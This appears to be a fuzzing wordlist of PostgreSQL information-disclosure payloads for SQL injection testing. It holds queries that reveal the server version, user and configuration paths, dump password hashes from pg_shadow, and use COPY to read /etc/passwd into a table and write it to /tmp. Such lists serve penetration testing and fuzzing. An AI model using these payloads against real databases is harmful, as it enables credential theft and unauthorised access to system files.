# info disclosure payload fuzzfile for pgsql
select version();	
select current_database();
select current_user;
select session_user;
select current_setting('log_connections');
select current_setting('log_statement');
select current_setting('port');
select current_setting('password_encryption');
select current_setting('krb_server_keyfile');
select current_setting('virtual_host');
select current_setting('port');
select current_setting('config_file');
select current_setting('hba_file');
select current_setting('data_directory');
select * from pg_shadow;
select * from pg_group;
create table myfile (input TEXT);
copy myfile from '/etc/passwd'; 
select * from myfile;copy myfile to /tmp/test;